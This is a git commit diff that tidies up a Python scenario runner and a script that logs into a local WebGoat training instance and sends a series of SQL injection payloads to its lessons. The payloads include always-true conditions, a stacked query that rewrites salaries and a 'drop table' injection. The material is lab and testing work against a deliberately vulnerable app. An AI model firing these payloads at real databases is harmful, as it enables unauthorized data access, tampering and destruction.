0941347521f69075679d3bfe069681526286260b
Yohan Kim <yohan.kim.1@etsmtl.net>
2023-03-30 01:21:05 -0400

    cleanup

--- main.py
+++ main.py
@@ -1,12 +1,7 @@
-from threading import Thread
-import scenarios.webgoat_sample as wg
-import scenarios.scenario_sample as ss
-import scenarios.temp as t
-#from config import stop_signal
-import signals
+from sys import argv
 from time import sleep
-import importlib
 from worker import Worker
+import signals
 
 def main(moduleList: list):
     try:
@@ -23,72 +18,20 @@ def main(moduleList: list):
         signals.stop_signal = 1
 
 if __name__ == '__main__':
-    moduleList = []
-    file = open('script1.txt', 'r').read().splitlines()
-    for line in file:
-        moduleList.append(line)
-    main(moduleList)
-
-    #webgoat_sample
-    #t1 = Thread(target=wg.run, args=["t1",])
-    #t2 = Thread(target=wg.run, args=["t2",])
-    #t1.daemon = True
-    #t2.daemon = True
-
-
-    ##scenario_sample
-    #s1 = ss.Scenario("s1")
-    #s2 = ss.Scenario("s2")
-    #t1 = Thread(target=s1.run)
-    #t2 = Thread(target=s2.run)
-    #try:        
-    #    t1.start()
-    #    t2.start()
-    #except(KeyboardInterrupt, SystemExit):
-    #    #s1.stop()
-    #    #s2.stop()
-    #    pass
-    #print("press ctrl+c to stop")
-    #input("")
-
-
-    #thread subclass
-    #s1 = ss.Scenario("s1")
-    #s2 = ss.Scenario("s2")
-    #try:
-    #    s1.start()
-    #    s2.start()
-    #    #s1.join()
-    #    #s2.join()
-    #except(KeyboardInterrupt, SystemExit):
-    #    print("stopping")
-    #    s1.stop()
-    #    s2.stop()
-
-
-    #test
-    #t1 = t.Scenario("t1")
-    #t2 = t.Scenario("t2")
-    #t1.daemon = True
-    #t2.daemon = True
-    #try:
-    #    t1.start()
-    #    t2.start()
-    #    while True: time.sleep(100)
-    #except(KeyboardInterrupt, SystemExit):
-    #    print("sending stop signal")
-    #    stop_signal = 1
-
-
-    #test2
-    #try:
-    #    w1 = Worker('scenarios.temp2')
-    #    w2 = Worker('scenarios.temp2')
-    #    w1.start()
-    #    w2.start()
-    #    while True: time.sleep(100)
-    #except(KeyboardInterrupt, SystemExit):
-    #    print("sending stop signal")
-    #    stop_signal = 1
-
-    
+    try:
+        if len(argv) < 2:
+            raise ValueError()
+        filename = argv[1]
+        if filename == None:
+            raise ValueError()
+        moduleList = []
+        file = open(filename, 'r').read().splitlines()
+        for line in file:
+            moduleList.append(line)
+        main(moduleList)
+    except ValueError:
+        print("invalid arguments")
+    except FileNotFoundError:
+        print("file not found")
+    except:
+        print("unexpected error")
--- scenarios/webgoat_sample.py
+++ scenarios/webgoat_sample.py
@@ -1,64 +1,63 @@
 import requests
 import time
 
-def log(text):
-    print(text)
-
-def run(thread_name):
+def main():
     host="http://127.0.0.1:8080/WebGoat"
 
     s = requests.Session()
 
-    #params = { 'username':'webgoat', 'password':'webgoat', 'matchingPassword':'webgoat', 'agree':'agree' }
-    #r = s.post(host + "/register.mvc", params=params)
-    #print(r.text)
+    params = { 'username':'webgoat', 'password':'webgoat', 'matchingPassword':'webgoat', 'agree':'agree' }
+    r = s.post(host + "/register.mvc", params=params)
+    print(str(r.status_code))
 
-    params = { 'username':'admin1', 'password':'admin1' }
+    time.sleep(1)
+
+    params = { 'username':'webgoat', 'password':'webgoat' }
     r = s.post(host + "/login", params=params)
-    log(thread_name + ' ' + str(r.status_code))
+    print(str(r.status_code))
 
     time.sleep(1)
 
     r = s.get(host + "/SqlInjection.lesson.lesson")
-    log(thread_name + ' ' + str(r.status_code))
+    print(str(r.status_code))
 
     time.sleep(1)
 
     params = { 'query':"select department from Employees where first_name='Bob'" }
     r = s.post(host + "/SqlInjection/attack2", params=params)
-    log(thread_name + ' ' + str(r.status_code))
+    print(str(r.status_code))
 
     time.sleep(1)
 
     params = { 'account':"=Smith'", 'operator':"or", 'injection':"'1'='1" }
     r = s.post(host + "/SqlInjection/assignment5a", params=params)
-    log(thread_name + ' ' + str(r.status_code))
+    print(str(r.status_code))
 
     time.sleep(1)
 
     params = { 'login_count':'1', 'userid':"0 or 1=1" }
     r = s.post(host + "/SqlInjection/assignment5b", params=params)
-    log(thread_name + ' ' + str(r.status_code))
+    print(str(r.status_code))
 
     time.sleep(1)
 
     params = { 'name':"Smith' or 1=1;--", 'auth_tan':'3SL99A' }
     r = s.post(host + "/SqlInjection/attack8", params=params)
-    log(thread_name + ' ' + str(r.status_code))
+    print(str(r.status_code))
 
     time.sleep(1)
 
     params = { 'name':"Smith'; update employees set salary=999999 where last_name='Smith';--", 'auth_tan':'3SL99A' }
     r = s.post(host + "/SqlInjection/attack9", params=params)
-    log(thread_name + ' ' + str(r.status_code))
+    print(str(r.status_code))
 
     time.sleep(1)
 
     params = { 'action_string':"';drop table access_log;--" }
     r = s.post(host + "/SqlInjection/attack10", params=params)
-    log(thread_name + ' ' + str(r.status_code))
+    print(str(r.status_code))
 
     time.sleep(1)
 
 if __name__ == '__main__':
-    run("standalone")
+    main()
